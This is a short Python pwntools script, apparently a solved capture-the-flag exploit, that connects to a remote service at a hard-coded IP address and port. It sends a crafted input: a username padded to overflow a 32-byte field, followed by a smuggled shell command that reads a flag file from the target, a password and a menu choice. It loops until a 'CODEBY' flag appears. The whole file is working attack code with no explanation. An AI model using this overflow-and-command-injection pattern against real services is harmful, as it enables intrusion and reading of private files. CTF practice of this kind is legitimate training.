# resolved
# coding=utf-8
from pwn import *

host = "62.173.140.174"
port = 17500
r = remote(host, port)
log = b'Oleg'
pas = b'Super_Oleg_admin'
a = True


while a:
    answer = r.recv().decode('utf-8')
    if 'name' in answer:
        r.sendline(log + b'A' * (32 - len(log)) + b'cat</home/oleg/flag.txt' + b' ' + pas + b' ' + b'2')
    if "CODEBY" in answer:
        print(answer)
        a = False



